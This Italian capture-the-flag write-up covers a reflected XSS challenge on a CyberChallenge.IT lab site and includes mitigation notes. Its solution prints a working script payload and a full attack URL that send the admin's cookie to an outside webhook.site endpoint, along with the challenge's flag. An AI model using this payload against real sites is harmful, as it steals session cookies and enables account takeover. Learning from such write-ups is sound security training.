# Writeup: WS_3.01 - XSS Simple 1

## Overview
- **Categoria**: Web  
- **Autore**: bonaff  
- **Difficoltà**: 482  
- **Stato**: Down (last checked: 5 minutes ago)  
- **URL**: [http://xss1.challs.cyberchallenge.it/](http://xss1.challs.cyberchallenge.it/)

## Descrizione 📝
Questa sfida è la prima di una serie di 5 challenge dedicate a **XSS** (Cross-Site Scripting). L’obiettivo è ottenere il cookie dell’admin sfruttando un form di “report” che invia un link al browser dell’amministratore.

## Soluzione 🎯

### 1. Meccanica di Base
- Sul sito, esiste un form dove è possibile inserire un URL da “segnalare”.  
- L’amministratore, visitando l’URL fornito, potrebbe eseguire eventuale codice JavaScript iniettato.

### 2. Preparazione di un End-Point (Webhook)
Per catturare il cookie dell’admin, usiamo un servizio come [Webhook.site](https://webhook.site/) o simili. Questo ci permette di ricevere e registrare le richieste HTTP, inclusi eventuali parametri in query string.

### 3. Costruzione del Payload XSS
Inseriamo uno script che, una volta caricato nel browser dell’admin, reindirizzi l’utente verso il nostro webhook con il cookie come parametro. Un esempio di payload:

```html
<script>
document.location='https://webhook.site/be498e6d-51b6-43eb-aac7-9b64b19f521c?c='+document.cookie
</script>
```
**URL Finale**:
```
http://xss1.challs.cyberchallenge.it/report?url=<script>document.location='https://webhook.site/be498e6d-51b6-43eb-aac7-9b64b19f521c?c='+document.cookie</script>
```
Questo link iniettato viene visualizzato (o cliccato) dall’admin. Una volta caricato, esegue lo script e invia il cookie al nostro endpoint.

### 4. Raccolta del Cookie e Flag
Su Webhook.site, noteremo una nuova richiesta GET con un parametro `c` che contiene il cookie dell’admin. 

```
https://webhook.site/be498e6d-51b6-43eb-aac7-9b64b19f521c?cflag=CCIT{7311ae0320a30749dcfc953327a5a355}
```

## Flag 🏁
```
CCIT{7311ae0320a30749dcfc953327a5a355}
```

## Lezioni Apprese 📚
1. **Stored vs Reflected XSS**: In questa challenge si tratta di un “reflected XSS” perché il payload viene inviato tramite un URL e riflesso al browser dell’admin.  
2. **Uso di Webhook**: I servizi di cattura richieste (webhook) sono utili per testare e dimostrare l’esfiltrazione di dati in tempo reale.  
3. **Protezione**: Per mitigare, bisognerebbe validare e sanificare gli input e applicare intestazioni di sicurezza (es. `Content-Security-Policy`).

## Tools Utilizzati 🛠️
- **Browser Web**: Per generare e testare l’URL malevolo.  
- **Webhook.site**: Per intercettare il cookie dell’admin.  
- **Dev Tools**: Per analizzare eventuali richieste e risposte.

---

*Writeup by Luca Crippa - Last Updated: 2024*
